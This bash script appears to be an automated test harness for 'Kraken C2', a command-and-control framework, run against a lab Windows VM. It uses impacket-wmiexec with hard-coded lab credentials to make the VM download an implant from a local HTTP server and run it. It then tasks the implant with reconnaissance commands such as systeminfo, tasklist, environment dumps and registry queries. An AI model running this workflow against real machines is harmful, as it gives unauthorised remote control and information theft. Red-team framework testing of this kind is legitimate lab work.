#!/bin/bash
# Automated Windows VM Testing Script for Kraken C2
# Usage: ./scripts/test-windows-vm.sh [VM_IP] [USERNAME] [PASSWORD]

set -e

VM_IP="${1:-192.168.247.132}"
USERNAME="${2:-labuser}"
PASSWORD="${3:-Password123!}"
SERVER_IP=$(ip -4 addr show | grep -oP '192\.168\.\d+\.\d+' | head -1)
KRAKEN_ROOT=$(dirname "$(dirname "$(readlink -f "$0")")")

echo "=== Kraken Windows VM Test Script ==="
echo "VM: $VM_IP | User: $USERNAME | Server: $SERVER_IP"
echo ""

# Check prerequisites
command -v impacket-wmiexec >/dev/null 2>&1 || { echo "ERROR: impacket-wmiexec not found"; exit 1; }

# Test VM connectivity
echo "[1/7] Testing VM connectivity..."
if ! ping -c 1 -W 2 "$VM_IP" >/dev/null 2>&1; then
    echo "ERROR: Cannot reach VM at $VM_IP"
    exit 1
fi
echo "      VM reachable"

# Test authentication
echo "[2/7] Testing WMI authentication..."
WHOAMI=$(impacket-wmiexec "$USERNAME:$PASSWORD@$VM_IP" 'whoami' 2>&1 | tail -1)
if [[ "$WHOAMI" != *"$USERNAME"* ]]; then
    echo "ERROR: Authentication failed"
    exit 1
fi
echo "      Auth OK: $WHOAMI"

# Build Windows implant
echo "[3/7] Building Windows implant..."
cd "$KRAKEN_ROOT"
cargo build --release --target x86_64-pc-windows-gnu -p implant-core --features "mod-shell,mod-file" 2>&1 | tail -3

# Start HTTP server for file transfer
echo "[4/7] Starting file transfer server..."
pkill -f "python3 -m http.server 8888" 2>/dev/null || true
cd "$KRAKEN_ROOT/target/x86_64-pc-windows-gnu/release"
python3 -m http.server 8888 &>/dev/null &
HTTP_PID=$!
sleep 1

# Upload implant to VM
echo "[5/7] Uploading implant to VM..."
impacket-wmiexec "$USERNAME:$PASSWORD@$VM_IP" \
    "powershell -Command \"Invoke-WebRequest -Uri http://$SERVER_IP:8888/implant.exe -OutFile C:\\Users\\$USERNAME\\Desktop\\implant.exe\"" \
    2>&1 | tail -1

# Verify upload
SIZE=$(impacket-wmiexec "$USERNAME:$PASSWORD@$VM_IP" \
    'powershell -Command "(Get-Item C:\Users\labuser\Desktop\implant.exe).Length"' 2>&1 | tail -1)
echo "      Uploaded: $SIZE bytes"

# Start Kraken server if not running
echo "[6/7] Checking Kraken server..."
if ! pgrep -f kraken-server >/dev/null; then
    echo "      Starting server..."
    cd "$KRAKEN_ROOT"
    rm -f kraken.db
    RUST_LOG=info ./target/release/kraken-server &>/tmp/kraken-server.log &
    sleep 3
fi
echo "      Server running"

# Run implant on Windows
echo "[7/7] Running implant on Windows..."
impacket-wmiexec "$USERNAME:$PASSWORD@$VM_IP" \
    "cmd /c \"set KRAKEN_SERVER=http://$SERVER_IP:8080 & start /b C:\\Users\\$USERNAME\\Desktop\\implant.exe\"" \
    2>&1 | tail -1

# Wait for registration
echo ""
echo "Waiting for implant registration..."
for i in {1..10}; do
    IMPLANT=$(sqlite3 "$KRAKEN_ROOT/kraken.db" "SELECT name FROM implants ORDER BY registered_at DESC LIMIT 1;" 2>/dev/null || echo "")
    if [[ -n "$IMPLANT" ]]; then
        echo "Implant registered: $IMPLANT"
        break
    fi
    sleep 2
done

if [[ -z "$IMPLANT" ]]; then
    echo "ERROR: Implant did not register within 20 seconds"
    kill $HTTP_PID 2>/dev/null
    exit 1
fi

# Get implant ID
IMPLANT_ID=$(sqlite3 "$KRAKEN_ROOT/kraken.db" "SELECT hex(id) FROM implants ORDER BY registered_at DESC LIMIT 1;")
echo "Implant ID: $IMPLANT_ID"
echo ""

# Run test commands
echo "=== Running Test Commands ==="
TASK_CLI="$KRAKEN_ROOT/target/release/task"

run_test() {
    local NAME="$1"
    local CMD="$2"

    echo -n "[$NAME] "
    TASK_ID=$("$TASK_CLI" "$IMPLANT_ID" shell "$CMD" 2>&1 | grep -oP 'ID: \K[a-f0-9]+')

    # Wait for completion
    for i in {1..20}; do
        STATUS=$(sqlite3 "$KRAKEN_ROOT/kraken.db" "SELECT status FROM tasks WHERE hex(id) = '${TASK_ID^^}';" 2>/dev/null)
        if [[ "$STATUS" == "completed" ]]; then
            RESULT=$(sqlite3 "$KRAKEN_ROOT/kraken.db" "SELECT result_data FROM tasks WHERE hex(id) = '${TASK_ID^^}';" 2>/dev/null)
            EXIT_CODE=$(echo "$RESULT" | grep -oP '"exit_code":\K\d+')
            DURATION=$(echo "$RESULT" | grep -oP '"duration_ms":\K\d+')
            if [[ "$EXIT_CODE" == "0" ]]; then
                echo "PASS (exit=$EXIT_CODE, ${DURATION}ms)"
            else
                echo "FAIL (exit=$EXIT_CODE)"
            fi
            return
        fi
        sleep 1
    done
    echo "TIMEOUT"
}

run_test "whoami" "whoami"
run_test "hostname" "hostname"
run_test "dir" "dir C:\\Windows"
run_test "systeminfo" "systeminfo"
run_test "powershell" "powershell -Command Write-Host 'Test'"

echo ""
echo "=== Running Stress Tests ==="

run_stress_test() {
    local NAME="$1"
    local CMD="$2"
    local EXPECT_SIZE="$3"

    echo -n "[$NAME] "
    TASK_ID=$("$TASK_CLI" "$IMPLANT_ID" shell "$CMD" 2>&1 | grep -oP 'ID: \K[a-f0-9]+')

    # Wait for completion (longer timeout for stress tests)
    for i in {1..60}; do
        STATUS=$(sqlite3 "$KRAKEN_ROOT/kraken.db" "SELECT status FROM tasks WHERE hex(id) = '${TASK_ID^^}';" 2>/dev/null)
        if [[ "$STATUS" == "completed" ]]; then
            RESULT_SIZE=$(sqlite3 "$KRAKEN_ROOT/kraken.db" "SELECT length(result_data) FROM tasks WHERE hex(id) = '${TASK_ID^^}';" 2>/dev/null)
            RESULT=$(sqlite3 "$KRAKEN_ROOT/kraken.db" "SELECT result_data FROM tasks WHERE hex(id) = '${TASK_ID^^}';" 2>/dev/null)
            EXIT_CODE=$(echo "$RESULT" | grep -oP '"exit_code":\K-?\d+')
            DURATION=$(echo "$RESULT" | grep -oP '"duration_ms":\K\d+')

            if [[ "$EXIT_CODE" == "0" ]]; then
                echo "PASS (${RESULT_SIZE} bytes, ${DURATION}ms)"
            else
                echo "FAIL (exit=$EXIT_CODE, ${RESULT_SIZE} bytes)"
            fi
            return 0
        fi
        sleep 1
    done
    echo "TIMEOUT (60s)"
    return 1
}

# Stress Test 1: Large output (~10KB+ - full directory listing)
run_stress_test "large-output-10kb" "dir /s C:\\Windows\\System32\\drivers" "10000"

# Stress Test 2: Very large output (~50KB - full tasklist)
run_stress_test "large-output-50kb" "tasklist /v" "30000"

# Stress Test 3: Deep recursive listing
run_stress_test "recursive-dir" "dir /s /b C:\\Windows\\Temp" "1000"

# Stress Test 4: Environment dump (many variables)
run_stress_test "env-dump" "set" "1000"

# Stress Test 5: Network info (ipconfig full)
run_stress_test "network-full" "ipconfig /all" "2000"

# Stress Test 6: PowerShell complex command
run_stress_test "ps-processes" "powershell -Command \"Get-Process | Format-Table -AutoSize | Out-String -Width 200\"" "5000"

# Stress Test 7: Registry query (many entries)
run_stress_test "registry-query" "reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall" "5000"

# Stress Test 8: Services list
run_stress_test "services-list" "sc query state= all" "10000"

# Stress Test 9: Rapid sequential commands
echo ""
echo "=== Rapid Fire Test (10 commands) ==="
RAPID_PASS=0
RAPID_FAIL=0
for i in {1..10}; do
    TASK_ID=$("$TASK_CLI" "$IMPLANT_ID" shell "echo test$i" 2>&1 | grep -oP 'ID: \K[a-f0-9]+')
done

# Wait for all rapid fire to complete
sleep 30
COMPLETED=$(sqlite3 "$KRAKEN_ROOT/kraken.db" "SELECT COUNT(*) FROM tasks WHERE status='completed';" 2>/dev/null)
TOTAL=$(sqlite3 "$KRAKEN_ROOT/kraken.db" "SELECT COUNT(*) FROM tasks;" 2>/dev/null)
echo "Rapid fire: $COMPLETED/$TOTAL tasks completed"

echo ""
echo "=== Test Summary ==="
PASS_COUNT=$(sqlite3 "$KRAKEN_ROOT/kraken.db" "SELECT COUNT(*) FROM tasks WHERE status='completed' AND result_data LIKE '%\"exit_code\":0%';" 2>/dev/null)
FAIL_COUNT=$(sqlite3 "$KRAKEN_ROOT/kraken.db" "SELECT COUNT(*) FROM tasks WHERE status='completed' AND result_data NOT LIKE '%\"exit_code\":0%';" 2>/dev/null)
PENDING_COUNT=$(sqlite3 "$KRAKEN_ROOT/kraken.db" "SELECT COUNT(*) FROM tasks WHERE status='pending';" 2>/dev/null)

echo "Passed:  $PASS_COUNT"
echo "Failed:  $FAIL_COUNT"
echo "Pending: $PENDING_COUNT"

# Calculate total output size
TOTAL_OUTPUT=$(sqlite3 "$KRAKEN_ROOT/kraken.db" "SELECT SUM(length(result_data)) FROM tasks WHERE status='completed';" 2>/dev/null)
echo "Total output: $TOTAL_OUTPUT bytes"

echo ""
echo "=== Windows Testing Complete ==="

# Cleanup
kill $HTTP_PID 2>/dev/null || true
